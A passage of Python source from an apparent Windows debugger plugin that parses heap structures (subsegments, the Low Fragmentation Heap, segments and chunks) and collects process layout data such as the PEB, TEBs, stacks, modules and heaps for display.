		self.UserBlocks     = readPtrSizeBytes(ssbase + self._offsets["UserBlocks"][ai])
		self.DelayFreeList  = ssbase + self._offsets["DelayFreeList"][ai]
		self.AggregateExchg = struct.unpack('<l', dbg.readMemory(ssbase + self._offsets["AggregateExchg"][ai], 4))[0]
		self.BlockSize      = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["BlockSize"][ai], 2))[0]
		self.Flags          = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["Flags"][ai], 2))[0]
		self.BlockCount     = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["BlockCount"][ai], 2))[0]
		self.SizeIndex      = struct.unpack('<B', dbg.readMemory(ssbase + self._offsets["SizeIndex"][ai], 1))[0]
		self.AffinityIndex  = struct.unpack('<B', dbg.readMemory(ssbase + self._offsets["AffinityIndex"][ai], 1))[0]
		self.SFreeListEntry = readPtrSizeBytes(ssbase + self._offsets["SFreeListEntry"][ai])
		self.Lock           = struct.unpack('<L', dbg.readMemory(ssbase + self._offsets["Lock"][ai], 4))[0]


class MnNT10SubSegment:
	"""
	Represents _HEAP_SUBSEGMENT on Windows 10/11.
	Lock and SFreeListEntry order swapped vs Win8 (Lock now before SFreeListEntry).
	x64 struct is 8 bytes smaller than Win8 x64 as a result.

	x86 layout (0x24 bytes):
	+0x000 LocalInfo      : Ptr32
	+0x004 UserBlocks     : Ptr32
	+0x008 DelayFreeList  : _SLIST_HEADER (8 bytes)
	+0x010 AggregateExchg : _INTERLOCK_SEQ (4 bytes)
	+0x014 BlockSize      : Uint2B  (union with Alignment[2] at +0x014)
	+0x016 Flags          : Uint2B
	+0x018 BlockCount     : Uint2B
	+0x01a SizeIndex      : UChar
	+0x01b AffinityIndex  : UChar
	+0x01c Lock           : Uint4B
	+0x020 SFreeListEntry : _SINGLE_LIST_ENTRY

	x64 layout (0x38 bytes):
	+0x000 LocalInfo      : Ptr64
	+0x008 UserBlocks     : Ptr64
	+0x010 DelayFreeList  : _SLIST_HEADER (16 bytes)
	+0x020 AggregateExchg : _INTERLOCK_SEQ (4 bytes)
	+0x024 BlockSize      : Uint2B  (union with Alignment[2] at +0x024)
	+0x026 Flags          : Uint2B
	+0x028 BlockCount     : Uint2B
	+0x02a SizeIndex      : UChar
	+0x02b AffinityIndex  : UChar
	+0x02c Lock           : Uint4B
	+0x030 SFreeListEntry : _SINGLE_LIST_ENTRY
	"""

	# _HEAP_SUBSEGMENT field offsets: (offset_x86, offset_x64)
	_offsets = {
		"LocalInfo":      (0x000, 0x000),
		"UserBlocks":     (0x004, 0x008),
		"DelayFreeList":  (0x008, 0x010),
		"AggregateExchg": (0x010, 0x020),
		"BlockSize":      (0x014, 0x024),
		"Flags":          (0x016, 0x026),
		"BlockCount":     (0x018, 0x028),
		"SizeIndex":      (0x01a, 0x02a),
		"AffinityIndex":  (0x01b, 0x02b),
		"Lock":           (0x01c, 0x02c),
		"SFreeListEntry": (0x020, 0x030),
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, ssbase):
		self.address = ssbase
		ai = self._arch_index

		self.LocalInfo      = readPtrSizeBytes(ssbase + self._offsets["LocalInfo"][ai])
		self.UserBlocks     = readPtrSizeBytes(ssbase + self._offsets["UserBlocks"][ai])
		self.DelayFreeList  = ssbase + self._offsets["DelayFreeList"][ai]
		self.AggregateExchg = struct.unpack('<l', dbg.readMemory(ssbase + self._offsets["AggregateExchg"][ai], 4))[0]
		self.BlockSize      = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["BlockSize"][ai], 2))[0]
		self.Flags          = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["Flags"][ai], 2))[0]
		self.BlockCount     = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["BlockCount"][ai], 2))[0]
		self.SizeIndex      = struct.unpack('<B', dbg.readMemory(ssbase + self._offsets["SizeIndex"][ai], 1))[0]
		self.AffinityIndex  = struct.unpack('<B', dbg.readMemory(ssbase + self._offsets["AffinityIndex"][ai], 1))[0]
		self.Lock           = struct.unpack('<L', dbg.readMemory(ssbase + self._offsets["Lock"][ai], 4))[0]
		self.SFreeListEntry = readPtrSizeBytes(ssbase + self._offsets["SFreeListEntry"][ai])


"""
Low Fragmentation Heap
"""
class MnLFH():

   # +0x000 Lock             : _RTL_CRITICAL_SECTION
   # +0x018 SubSegmentZones  : _LIST_ENTRY
   # +0x020 ZoneBlockSize    : Uint4B
   # +0x024 Heap             : Ptr32 Void
   # +0x028 SegmentChange    : Uint4B
   # +0x02c SegmentCreate    : Uint4B
   # +0x030 SegmentInsertInFree : Uint4B
   # +0x034 SegmentDelete    : Uint4B
   # +0x038 CacheAllocs      : Uint4B
   # +0x03c CacheFrees       : Uint4B
   # +0x040 SizeInCache      : Uint4B
   # +0x048 RunInfo          : _HEAP_BUCKET_RUN_INFO
   # +0x050 UserBlockCache   : [12] _USER_MEMORY_CACHE_ENTRY
   # +0x110 Buckets          : [128] _HEAP_BUCKET
   # +0x310 LocalData        : [1] _HEAP_LOCAL_DATA

   # blocks : LocalData->SegmentInfos->SubSegments (Mgmt List)->SubSegs
   
	# class attributes
	Lock = None
	SubSegmentZones = None
	ZoneBlockSize = None
	Heap = None
	SegmentChange = None
	SegmentCreate = None
	SegmentInsertInFree = None
	SegmentDelete = None
	CacheAllocs = None
	CacheFrees = None
	SizeInCache = None
	RunInfo = None
	UserBlockCache = None
	Buckets = None
	LocalData = None
	
	def __init__(self,lfhbase):
		self.lfhbase = lfhbase
		self.populateLFHFields()
		return
		
	def populateLFHFields(self):
		# read 0x310 bytes and split into pieces
		FLHHeader = dbg.readMemory(self.lfhbase,0x310)
		self.Lock = FLHHeader[0:0x18]
		self.SubSegmentZones = []
		self.SubSegmentZones.append(struct.unpack('<L',FLHHeader[0x18:0x1c])[0])
		self.SubSegmentZones.append(struct.unpack('<L',FLHHeader[0x1c:0x20])[0])
		self.ZoneBlockSize = struct.unpack('<L',FLHHeader[0x20:0x24])[0]
		self.Heap = struct.unpack('<L',FLHHeader[0x24:0x28])[0]
		self.SegmentChange = struct.unpack('<L',FLHHeader[0x28:0x2c])[0]
		self.SegmentCreate = struct.unpack('<L',FLHHeader[0x2c:0x30])[0]
		self.SegmentInsertInFree = struct.unpack('<L',FLHHeader[0x30:0x34])[0]
		self.SegmentDelete = struct.unpack('<L',FLHHeader[0x34:0x38])[0]
		self.CacheAllocs = struct.unpack('<L',FLHHeader[0x38:0x3c])[0]
		self.CacheFrees = struct.unpack('<L',FLHHeader[0x3c:0x40])[0]
		self.SizeInCache = struct.unpack('<L',FLHHeader[0x40:0x44])[0]
		self.RunInfo = []
		self.RunInfo.append(struct.unpack('<L',FLHHeader[0x48:0x4c])[0])
		self.RunInfo.append(struct.unpack('<L',FLHHeader[0x4c:0x50])[0])
		self.UserBlockCache = []
		cnt = 0
		while cnt < (12*4):
			self.UserBlockCache.append(struct.unpack('<L',FLHHeader[0x50+cnt:0x54+cnt])[0])
			cnt += 4

	def getSegmentInfo(self):
		# input : self.LocalData
		# output : return SubSegment
		return

	def getSubSegmentList(self):
		# input : SubSegment
		# output : subsegment mgmt list
		return

	def getSubSegment(self):
		# input : subsegment list
		# output : subsegments/blocks
		return

"""
MnHeap Childclass
"""
class MnSegment:
	def __init__(self,heapbase,segmentstart,segmentend,firstentry=0,lastvalidentry=0):
		self.heapbase = heapbase
		self.segmentstart = segmentstart
		self.segmentend = segmentend
		self.firstentry = segmentstart
		self.lastvalidentry = segmentend
		if firstentry > 0:
			self.firstentry = firstentry
		if lastvalidentry > 0:
			self.lastvalidentry = lastvalidentry
		self.chunks = {}

	def getChunks(self):
		"""
		Enumerate all chunks in the current segment
		Output : Dictionary, key = chunkptr
		         Values : MnChunk objects
		         chunktype will be set to "chunk"
		"""
		thischunk = self.firstentry
		allchunksfound = False
		allchunks = {}
		nextchunk = thischunk
		cnt = 0
		savedprevsize = 0
		mHeap = MnHeap(self.heapbase)
		key = mHeap.getEncodingKey()
		header_data_offset = mHeap.getChunkHeaderDataOffset()
		while not allchunksfound:
			thissize = 0
			prevsize = 0
			flag = 0
			unused = 0
			segmentid = 0
			tag = 0
			headersize = 0x8
			try:
				fullheaderbin = ""
				if key == 0 and not win7mode:
					fullheaderbin = dbg.readMemory(thischunk + header_data_offset, headersize)
				else:
					fullheaderbin = decodeHeapHeader(thischunk + header_data_offset, headersize, key)

				sizebytes = fullheaderbin[0:2]
				thissize = struct.unpack('<H',sizebytes)[0]
				
				if key == 0 and not win7mode:
					prevsizebytes = struct.unpack('<H',fullheaderbin[2:4])[0]
					segmentid = struct.unpack('<B',fullheaderbin[4:5])[0]
					flag = struct.unpack('<B',fullheaderbin[5:6])[0]
					unused = struct.unpack('<B',fullheaderbin[6:7])[0]
					tag = struct.unpack('<B',fullheaderbin[7:8])[0]
						
				else:
					flag = struct.unpack('<B',fullheaderbin[2:3])[0]
					tag = struct.unpack('<B',fullheaderbin[3:4])[0]
					prevsizebytes = struct.unpack('<H',fullheaderbin[4:6])[0]
					segmentid = struct.unpack('<B',fullheaderbin[6:7])[0]
					unused = struct.unpack('<B',fullheaderbin[7:8])[0]

				if savedprevsize == 0:
					prevsize = 0
					savedprevsize = thissize
				else:
					prevsize = savedprevsize
					savedprevsize = thissize

				#prevsize = prevsizebytes
					
			except:
				thissize = 0
				prevsize = 0
				flag = 0
				unused = 0

			if thissize > 0:
				nextchunk = thischunk + (thissize * heapgranularity)
			else:
				nextchunk += heapgranularity

			chunktype = "chunk"
			is_virtalloc = "virtall" in getHeapFlag(flag).lower()
			if is_virtalloc or "internal" in getHeapFlag(flag).lower():
				headersize = 0x20

			# Virtual-alloc chunks are tracked separately via getVirtualAllocdBlocks().
			# Skip them here so they don't appear mixed in with segment chunks.
			if not is_virtalloc and not thischunk in allchunks and thissize > 0:
				mChunk = MnChunk(thischunk,chunktype,headersize,self.heapbase,self.segmentstart,thissize,prevsize,segmentid,flag,unused,tag)
				allchunks[thischunk] = mChunk
			
			thischunk = nextchunk

			if nextchunk >= self.lastvalidentry:
				allchunksfound = True
			if "last" in getHeapFlag(flag).lower():
				allchunksfound = True
			
			cnt += 1
		self.chunks = allchunks
		return allchunks

"""
Chunk class
"""
class MnChunk:
	chunkptr = 0
	chunktype = ""
	headersize = 0
	extraheadersize = 0
	heapbase = 0
	segmentbase = 0
	size = 0
	prevsize = 0
	segment = 0
	flag = 0
	flags = 0
	unused = 0
	tag = 0
	flink = 0
	blink = 0
	commitsize = 0
	reservesize = 0
	remaining = 0
	hasust = False
	dph_block_information_startstamp = 0 
	dph_block_information_heap = 0
	dph_block_information_requestedsize = 0 
	dph_block_information_actualsize = 0
	dph_block_information_traceindex = 0
	dph_block_information_stacktrace = 0
	dph_block_information_endstamp = 0	

	def __init__(self,chunkptr,chunktype,headersize,heapbase,segmentbase,size,prevsize,segment,flag,unused,tag,flink=0,blink=0,commitsize=0,reservesize=0):
		self.chunkptr = chunkptr
		self.chunktype = chunktype
		self.extraheadersize = 0
		self.remaining = 0
		self.dph_block_information_startstamp = 0 
		self.dph_block_information_heap = 0
		self.dph_block_information_requestedsize = 0 
		self.dph_block_information_actualsize = 0
		self.dph_block_information_traceindex = 0
		self.dph_block_information_stacktrace = 0
		self.dph_block_information_endstamp = 0
		self.hasust = False
		# if ust/hpa is enabled, the chunk header is followed by 32bytes of DPH_BLOCK_INFORMATION header info
		currentflagnames = getNtGlobalFlagNames(getNtGlobalFlag())
		if "ust" in currentflagnames:
			self.hasust = True
		if "hpa" in currentflagnames:
			# reader header info
			if arch == 32:
				self.extraheadersize = 0x20
				try:
					raw_dph_header = dbg.readMemory(chunkptr + headersize,0x20)
					self.dph_block_information_startstamp = struct.unpack('<L',raw_dph_header[0:4])[0]
					self.dph_block_information_heap = struct.unpack('<L',raw_dph_header[4:8])[0]
					self.dph_block_information_requestedsize = struct.unpack('<L',raw_dph_header[8:12])[0]
					self.dph_block_information_actualsize = struct.unpack('<L',raw_dph_header[12:16])[0]
					self.dph_block_information_traceindex = struct.unpack('<H',raw_dph_header[16:18])[0]
					self.dph_block_information_stacktrace = struct.unpack('<L',raw_dph_header[24:28])[0]
					self.dph_block_information_endstamp = struct.unpack('<L',raw_dph_header[28:32])[0]
				except:
					pass
			elif arch == 64:
				self.extraheadersize = 0x40
				# reader header info
				try:
					raw_dph_header = dbg.readMemory(chunkptr + headersize,0x40)
					self.dph_block_information_startstamp = struct.unpack('<L',raw_dph_header[0:4])[0]
					self.dph_block_information_heap = struct.unpack('<Q',raw_dph_header[8:16])[0]
					self.dph_block_information_requestedsize = struct.unpack('<Q',raw_dph_header[16:24])[0]
					self.dph_block_information_actualsize = struct.unpack('<Q',raw_dph_header[24:32])[0]
					self.dph_block_information_traceindex = struct.unpack('<H',raw_dph_header[32:34])[0]
					self.dph_block_information_stacktrace = struct.unpack('<Q',raw_dph_header[48:56])[0]
					self.dph_block_information_endstamp = struct.unpack('<L',raw_dph_header[60:64])[0]
				except:
					pass
		self.headersize = headersize
		self.heapbase = heapbase
		self.segmentbase = segmentbase
		self.size = size
		self.prevsize = prevsize
		self.segment = segment
		self.flag = flag
		self.flags = flag
		self.unused = unused
		self.tag = tag
		self.flink = flink
		self.blink = blink
		self.commitsize = commitsize
		self.reservesize = reservesize
		self.userptr = self.chunkptr + self.headersize + self.extraheadersize
		self.usersize = (self.size * heapgranularity) - self.unused - self.extraheadersize
		self.remaining = self.unused - self.headersize - self.extraheadersize
		self.flagtxt = getHeapFlag(self.flag)

	def fill(self, fillchar="A", start=None, size=None):
		"""
		Fill chunk data with a single byte.

		Arguments:
			fillchar - byte/char to use for filling (only first byte is used)
			start    - optional start address override (defaults to userptr)
			size     - optional size override (defaults to usersize)

		Return:
			(start_addr, written_size) on success, (0, 0) if nothing was written
		"""
		if start is None:
			start = self.userptr
		if size is None:
			size = self.usersize
		if size is None or size <= 0:
			return (0, 0)

		fillbyte = _normalize_single_fill_byte(fillchar)
		if len(fillbyte) == 0:
			return (0, 0)

		data = fillbyte * size
		try:
			dbg.writeMemory(start, data)
		except Exception as e:
			errormsg = "Error writing to address %s: %s" % ((PTR_PRINT % start), str(e))
			dbg.log(errormsg)
			pass
		return (start, size)


	def showChunk(self,showdata = False):
		chunkshown = False
		if self.chunktype == "chunk":
			dbg.log("    _HEAP @ %08x, Segment @ %08x" % (self.heapbase,self.segmentbase))
			if win7mode:
				iHeap = MnHeap(self.heapbase)
				if iHeap.usesLFH():
					dbg.log("    Heap has LFH enabled. LFH Heap starts at 0x%08x" % iHeap.getLFHAddress())
					if "busy" in self.flagtxt.lower() and "virtallocd" in self.flagtxt.lower():
						dbg.log("    ** This chunk may be managed by LFH")
						self.flagtxt = self.flagtxt.replace("Virtallocd","Internal")
			dbg.log("                      (         bytes        )                   (bytes)")						
			dbg.log("      HEAP_ENTRY      Size  PrevSize    Unused Flags    UserPtr  UserSize Remaining - state")
			dbg.log("        %08x  %08x  %08x  %08x  [%02x]   %08x  %08x  %08x   %s  (hex)" % (self.chunkptr,self.size*heapgranularity,self.prevsize*heapgranularity,self.unused,self.flag,self.userptr,self.usersize,self.unused-self.headersize,self.flagtxt))
			dbg.log("                  %08d  %08d  %08d                   %08d  %08d   %s  (dec)" % (self.size*heapgranularity,self.prevsize*heapgranularity,self.unused,self.usersize,self.unused-self.headersize,self.flagtxt))
			dbg.log("")
			chunkshown = True

		if self.chunktype == "virtualalloc":
			dbg.log("    _HEAP @ %08x, VirtualAllocdBlocks" % (self.heapbase))
			dbg.log("      FLINK : 0x%08x, BLINK : 0x%08x" % (self.flink,self.blink))
			dbg.log("      CommitSize : 0x%08x bytes, ReserveSize : 0x%08x bytes" % (self.commitsize*heapgranularity, self.reservesize*heapgranularity))
			dbg.log("                      (         bytes        )                   (bytes)")						
			dbg.log("      HEAP_ENTRY      Size  PrevSize    Unused Flags    UserPtr  UserSize - state")
			dbg.log("        %08x  %08x  %08x  %08x  [%02x]   %08x  %08x   %s  (hex)" % (self.chunkptr,self.size*heapgranularity,self.prevsize*heapgranularity,self.unused,self.flag,self.userptr,self.usersize,self.flagtxt))
			dbg.log("                  %08d  %08d  %08d                   %08d   %s  (dec)" % (self.size*heapgranularity,self.prevsize*heapgranularity,self.unused,self.usersize,self.flagtxt))
			dbg.log("")
			chunkshown = True

		if chunkshown:
			requestedsize = self.usersize
			dbg.log("      Chunk header size: 0x%x (%d)" % (self.headersize,self.headersize))
			if self.extraheadersize > 0:
				dbg.log("      Extra header due to GFlags: 0x%x (%d) bytes" % (self.extraheadersize,self.extraheadersize))
			if self.dph_block_information_stacktrace > 0:
				dbg.log("      DPH_BLOCK_INFORMATION Header size: 0x%x (%d)" % (self.extraheadersize,self.extraheadersize))
				dbg.log("         StartStamp    : 0x%08x" % self.dph_block_information_startstamp)
				dbg.log("         Heap          : 0x%08x" % self.dph_block_information_heap)
				dbg.log("         RequestedSize : 0x%08x" % self.dph_block_information_requestedsize)
				requestedsize = self.dph_block_information_requestedsize
				dbg.log("         ActualSize    : 0x%08x" % self.dph_block_information_actualsize)
				dbg.log("         TraceIndex    : 0x%08x" % self.dph_block_information_traceindex)
				dbg.log("         StackTrace    : 0x%08x" % self.dph_block_information_stacktrace)
				dbg.log("         EndStamp      : 0x%08x" % self.dph_block_information_endstamp)	
			dbg.log("      Size initial allocation request: 0x%x (%d)" % (requestedsize,requestedsize))
			dbg.log("      Total space for data: 0x%x (%d)" % (self.usersize + self.unused - self.headersize,self.usersize + self.unused - self.headersize))
			dbg.log("      Delta between initial size and total space for data: 0x%x (%d)" % (self.unused - self.headersize, self.unused-self.headersize))
			if showdata:
				dsize = self.usersize + self.remaining
				if dsize > 0 and dsize < 32:
					contents = bin2hex(dbg.readMemory(self.userptr,self.usersize+self.remaining))
				else:
					contents = bin2hex(dbg.readMemory(self.userptr,32)) + " ..."
				dbg.log("      Data : %s" % contents)
			dbg.log("")
		return

	def showChunkLine(self,showdata = False):
		return


#---------------------------------------#
#  Class to represent process layout    #
#---------------------------------------#
class MnProc:
	"""
	Aggregates all major process structures: PEB/TEB, modules,
	stacks, heaps (with type detection, segments, VA blocks,
	chunk statistics), and memory pages.

	Also holds process-level caches as instance attributes.
	"""

	memProtConstants = {
		"X": ["PAGE_EXECUTE", 0x10],
		"PAGE_EXECUTE": ["PAGE_EXECUTE", 0x10],
		"RX": ["PAGE_EXECUTE_READ", 0x20],
		"PAGE_EXECUTE_READ": ["PAGE_EXECUTE_READ", 0x20],
		"RWX": ["PAGE_EXECUTE_READWRITE", 0x40],
		"RXW": ["PAGE_EXECUTE_READWRITE", 0x40],
		"PAGE_EXECUTE_READWRITE": ["PAGE_EXECUTE_READWRITE", 0x40],
		"XW": ["PAGE_EXECUTE_WRITECOPY", 0x80],
		"PAGE_EXECUTE_WRITECOPY": ["PAGE_EXECUTE_WRITECOPY", 0x80],
		"N": ["PAGE_NOACCESS", 0x1],
		"PAGE_NOACCESS": ["PAGE_NOACCESS", 0x1],
		"R": ["PAGE_READONLY", 0x2],
		"PAGE_READONLY": ["PAGE_READONLY", 0x2],
		"RW": ["PAGE_READWRITE", 0x4],
		"PAGE_READWRITE": ["PAGE_READWRITE", 0x4],
		"W": ["PAGE_WRITECOPY", 0x8],
		"PAGE_WRITECOPY": ["PAGE_WRITECOPY", 0x8],
		"GUARD": ["PAGE_GUARD", 0x100],
		"PAGE_GUARD": ["PAGE_GUARD", 0x100],
		"NOCACHE": ["PAGE_NOCACHE", 0x200],
		"PAGE_NOCACHE": ["PAGE_NOCACHE", 0x200],
		"WC": ["PAGE_WRITECOMBINE", 0x400],
		"PAGE_WRITECOMBINE": ["PAGE_WRITECOMBINE", 0x400],
	}

	_FE_NAMES = {0: "None", 1: "LAL", 2: "LFH"}

	def __init__(self):
		dbgp(get_current_function_name())

		# --- process-level caches ---
		self.CritCache = {}
		self.vtableCache = {}
		self.stacklistCache = {}
		self.segmentlistCache = {}
		self.VACache = {}
		self.IATCache = {}
		self.NtGlobalFlag = -1
		self.FreeListBitmap = {}
		self.g_modules = {}
		self.g_modulesOrder = None
		self._is_populating_modules = False

		# --- populated by populate() ---
		self.peb = None
		self.peb = self.getPEB()
		self.teb = None
		self.threads = {}      # {tid: MnTEB} — populated by getThreads()
		self.modules = {}      # {name: {"base","top","size",...}} from g_modules
		self.stacks = {}       # {tid: {"base", "limit", "size", "teb"}} — populated by getStacks()
		self.heapinfo = {}     # from getProcessHeapsInfo(): {"NT":{}, "Segment":{}, "Unknown":{}}
		self.ntheapdetail = {} # {heapaddr: getNTHeapInfo() result}
		self.defaultheap = 0   # default process heap address

	def getPEB(self):
		"""Return the cached MnPEB, populating if needed."""
		if self.peb is None:
			self.peb = MnPEB()
		return self.peb

	def getCurrentTEB(self):
		"""Return the MnTEB for the current thread."""
		addr = self.teb if self.teb else get_teb_addr()
		if not addr:
			return None
		# Prefer the already-constructed instance from the threads cache
		for mteb in self.threads.values():
			if mteb.TEBAddress == addr:
				return mteb
		return MnTEB(addr, peb=self.peb)

	def getTEBs(self):
		"""Return a list of MnTEB objects for all threads in the process."""
		return list(self.getThreads().values())

	def getThreads(self):
		"""
		Return the cached {tid: MnTEB} dict.
		Populates on first call using dbg.getAllThreads().
		"""
		if not self.threads:
			for thread in dbg.getAllThreads():
				teb_addr = thread.getTEB()
				tid = thread.getId()
				self.threads[tid] = MnTEB(teb_addr, peb=self.peb)
		return self.threads

	def getStacks(self):
		"""
		Return the cached {tid: {"base", "limit", "size", "teb"}} dict.
		Built from the thread cache on first call.
		"""
		if not self.stacks:
			for tid, teb in self.getThreads().items():
				self.stacks[tid] = {
					"base":  teb.StackBase,
					"limit": teb.StackLimit,
					"size":  teb.StackBase - teb.StackLimit,
					"teb":   teb.TEBAddress,
				}
		return self.stacks

	def getTEBForStackAddress(self, addr):
		"""
		Return the MnTEB whose stack contains *addr*, or None.
		"""
		for tid, teb in self.getThreads().items():
			if teb.StackLimit <= addr <= teb.StackBase:
				return teb
		return None

	def getModuleForAddress(self, addr):
		"""Return the MnModule containing *addr*, or None."""
		self.populate(entities=["modules"])
		for modkey, props in self.g_modules.items():
			if props["base"] <= addr <= props["top"]:
				return MnModule(modkey)
		return None

	def populateVACache(self):
		"""
		Build a lookup table of all heap segment ranges and VA block ranges
		into self.VACache for fast isInHeap() lookups.
		"""
		seg_ranges = []
		va_ranges = []
		try:
			allheaps = dbg.getHeapsAddress()
		except:
			allheaps = []
		for heap in allheaps:
			segments = getSegmentsForHeap(heap)
			for segment in segments:
				segstart = segment
				seglast = segments[segment][3]
				seg_ranges.append((heap, segstart, seglast))
			try:
				mHeap = MnHeap(heap)
				valist = mHeap.getVirtualAllocdBlocks()
				for vachunk in valist:
					vainfo = valist[vachunk]
					va_ranges.append((vachunk, vachunk + vainfo["commit_size"]))
			except:
				pass
		seg_ranges.sort(key=lambda x: x[1])
		va_ranges.sort(key=lambda x: x[0])
		self.VACache = {"segments": seg_ranges, "vablocks": va_ranges}

	def _normalizePopulateEntities(self, entities, include_modules):
		"""
		Normalize populate entity selection into a lowercase token set.

		Supported tokens:
			peb, teb, threads, stacks, modules,
			heaps, defaultheap, ntheapdetail, vacache, chunks, all
		"""
		all_entities = set([
			"peb", "teb", "threads", "stacks", "modules",
			"heaps", "defaultheap", "ntheapdetail", "vacache", "chunks",
		])
		aliases = {
			"all": set(all_entities),
			"core": set(["peb", "teb", "threads", "stacks", "modules"]),
			"heap": set(["heaps", "defaultheap", "ntheapdetail"]),
			"memory": set(["heaps", "defaultheap", "ntheapdetail", "vacache"]),
		}

		if entities is None:
			selected = set(["peb", "teb", "threads", "stacks", "heaps", "defaultheap", "ntheapdetail"])
			if include_modules:
				selected.add("modules")
			return selected

		if type(entities).__name__.lower() in ["str", "unicode"]:
			raw = [x.strip().lower() for x in entities.split(",") if x.strip() != ""]
		else:
			raw = []
			for item in entities:
				raw.append(str(item).strip().lower())

		selected = set()
		for token in raw:
			if token in aliases:
				selected |= aliases[token]
			elif token in all_entities:
				selected.add(token)

		return selected

	def populate(self, include_chunks=False, include_modules=True, entities=None):
		"""
		Populate selected fields by querying the debugger.

		Arguments:
			include_chunks - bool. If True, walks segments and enumerates
			                 chunks. This can be slow on large heaps.
			include_modules - bool. Kept for backward compatibility when
			                 entities is None.
			entities - None, comma-separated string, or iterable of tokens.
			           Controls which structures are populated.
		"""
		selected = self._normalizePopulateEntities(entities, include_modules)
		if len(selected) == 0:
			return

		if "chunks" in selected:
			include_chunks = True
			selected.add("ntheapdetail")
			selected.add("heaps")
		# PEB / TEB
		if "peb" in selected and self.peb is None:
			try:
				self.peb = self.getPEB()
			except:
				pass
		if "teb" in selected and self.teb is None:
			try:
				self.teb = get_teb_addr()
			except:
				pass

		# Modules
		if "modules" in selected and len(self.modules) == 0:
			if self._is_populating_modules:
				self.modules = dict(self.g_modules)
			else:
				populateModuleInfo()
			self.modules = dict(self.g_modules)

		# Stacks
		if "threads" in selected:
			self.getThreads()
		if "stacks" in selected and len(self.stacks) == 0:
			self.getStacks()

		# Heaps (type detection + encoding info)
		if "heaps" in selected and len(self.heapinfo) == 0:
			self.heapinfo = getProcessHeapsInfo()

		# Default process heap
		if "defaultheap" in selected and not self.defaultheap:
			try:
				self.defaultheap = getDefaultProcessHeap()
			except:
				pass

		# NT heap detail (segments, VA blocks, optionally chunks)
		if "ntheapdetail" in selected:
			if len(self.heapinfo) == 0:
				self.heapinfo = getProcessHeapsInfo()
			for heapaddr in self.heapinfo.get("NT", {}):
			# Skip if already populated (unless upgrading to include chunks)
				if heapaddr in self.ntheapdetail:
					existing = self.ntheapdetail[heapaddr]
					needs_chunks = include_chunks and not existing.get("_has_chunks", False)
					if not needs_chunks:
						continue
				try:
					if include_chunks:
						detail = getNTHeapInfo(heapaddr)
						try:
							mheap = MnHeap(heapaddr)
							detail["frontend_type"] = mheap.getFrontEndHeapType()
						except:
							if "frontend_type" not in detail:
								detail["frontend_type"] = 0
						detail["_has_chunks"] = True
						self.ntheapdetail[heapaddr] = detail
					else:
						mheap = MnHeap(heapaddr)
						detail = {"segments": {}, "va_blocks": {}, "frontend_type": 0}
						try:
							detail["frontend_type"] = mheap.getFrontEndHeapType()
						except:
							pass
						try:
							seglist = mheap.getHeapSegmentList()
							for segaddr, seg in seglist.items():
								segdetail = {
									"base": seg["base"],
									"end": seg["end"],
									"firstentry": seg["firstentry"],
									"lastentry": seg["lastentry"],
								}
								detail["segments"][segaddr] = segdetail
						except:
							pass
						try:
							detail["va_blocks"] = mheap.getVirtualAllocdBlocks()
						except:
							pass
						self.ntheapdetail[heapaddr] = detail
				except:
					pass

		if "vacache" in selected and len(self.VACache) == 0:
			self.populateVACache()

	def getModulesSorted(self):
		"""Return modules sorted by base address: [(name, properties), ...]"""
		return sorted(self.modules.items(), key=lambda x: x[1]["base"])

	def getStacksSorted(self):
		"""Return stacks sorted by base address: [(tid, [base, top]), ...]"""
		return sorted(self.stacks.items(), key=lambda x: x[1][0])

	def getAllHeapsSorted(self):
		"""
		Return all heaps across all types, sorted by address.
		Each item: (address, type_str, info_dict)
		"""
		result = []
		# Keep a single entry per address, preferring NT over Segment over Unknown.
		seen = {}
		for htype in ("NT", "Segment", "Unknown"):
			for addr, info in self.heapinfo.get(htype, {}).items():
				if addr in seen:
					continue
				seen[addr] = (addr, htype, info)
		result = list(seen.values())
		result.sort(key=lambda x: x[0])
		return result

	def getNTHeapAddresses(self):
		"""Return sorted list of NT heap base addresses."""
		return sorted(self.heapinfo.get("NT", {}).keys())

	def getSegmentHeapAddresses(self):
		"""Return sorted list of Segment heap base addresses."""
		return sorted(self.heapinfo.get("Segment", {}).keys())

	def _getImmunityStructSizes(self):
		"""Return (peb_size, teb_size) based on OS major version for Immunity Debugger."""
		try:
			os_info = dbg.getOsRelease()
			major = os_info[0]
		except:
			major = 0
		if major >= 10:
			return (0x488, 0x1038)
		elif major == 6:
			return (0x380, 0xF28)
		else:
			return (0x210, 0x1000)

	# --- Private region-building helpers ---

	def _struct_sizes(self):
		"""Return (peb_size, teb_size) for the current debugger and architecture."""
		static = __DEBUGGERAPP__ == "Immunity Debugger"
		if __DEBUGGERAPP__ == "WinDBG":
			peb_size = dbg.getTypeSize("ntdll!_PEB")
			teb_size = dbg.getTypeSize("ntdll!_TEB")
		elif static:
			peb_size, teb_size = self._getImmunityStructSizes()
		else:
			peb_size = teb_size = 0
		if peb_size == 0:
			peb_size = archValue(0x480, 0x7C8)
		if teb_size == 0:
			teb_size = archValue(0x1000, 0x1838)
		return peb_size, teb_size

	def _peb_entry(self, peb_size):
		"""Return (start, end, "PEB", desc) from self.peb (MnPEB)."""
		peb     = self.peb
		threads = self.getThreads()
		pid     = str(next(iter(threads.values())).ProcessId) if threads else ""
		return (peb.PEBAddress, peb.PEBAddress + peb_size, "PEB",
				"%s (PID: %s)" % (clickPEB("PEB"), pid))

	def _teb_entry(self, tid, mteb, teb_size, current_teb_addr):
		"""Return (start, end, "TEB", desc) from an MnTEB instance."""
		teb_addr = mteb.TEBAddress
		cur      = "*" if teb_addr == current_teb_addr else ""
		if arch == 32:
			desc = "%s%s (TID: %s | SEH Count: %s)" % (cur, clickTEB(teb_addr, "TEB"), str(mteb.Id), str(mteb.SEHCount))
		else:
			desc = "%s%s (TID: %s)" % (cur, clickTEB(teb_addr, "TEB"), str(mteb.Id))
		return (teb_addr, teb_addr + teb_size, "TEB", desc)

	def _stack_entry(self, tid, mteb, sinfo, stackaddy):
		"""Return (start, end, "Stack", desc) for a thread's stack, using MnTEB.SEHChain."""
		stack_low  = sinfo["limit"]
		stack_high = sinfo["base"]
		cur        = "*" if stack_low <= stackaddy <= stack_high else ""
		seh_info   = ""
		if arch == 32 and hasattr(mteb, "SEHChain") and len(mteb.SEHChain) > 0:
